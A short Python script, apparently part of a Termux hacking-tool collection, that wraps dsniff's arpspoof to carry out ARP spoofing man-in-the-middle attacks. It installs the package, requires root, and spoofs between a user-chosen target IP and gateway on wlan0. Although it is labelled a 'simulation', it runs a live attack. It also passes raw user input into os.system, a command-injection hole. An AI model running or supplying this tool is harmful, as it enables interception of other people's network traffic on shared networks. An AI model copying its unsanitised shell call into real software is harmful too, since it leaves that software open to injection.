# CREATED BY: RAMIZ UDDIN
import os, time

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

# CREATED BY: RAMIZ UDDIN
import cyber_deps
cyber_deps.ensure_deps(system_pkgs=["dsniff"])
import os
def run():
    while True:
        print("\033[1;32m[*] ", end=""); print("\n\033[1;31m[*] ARP Spoofer (Man-in-the-Middle Simulation)\033[0m")
        if os.geteuid() != 0:
            print("\033[1;32m[*] ", end=""); print("[!] This tool requires ROOT access. Run with 'tsu'.")
            break
        target_ip = input("\nEnter Target IP (or '0' to exit): ")
        if target_ip == '0': break
        gateway_ip = input("Enter Gateway/Router IP: ")
        print("\033[1;32m[*] ", end=""); print(f"[*] Starting ARP Spoofing: {target_ip} <-> {gateway_ip}")
        print("\033[1;32m[*] ", end=""); print("[*] Press Ctrl+C to Stop.")
        os.system(f"arpspoof -i wlan0 -t {target_ip} {gateway_ip}")
        input("\n[Press Enter to Return]")
if __name__ == "__main__": run()
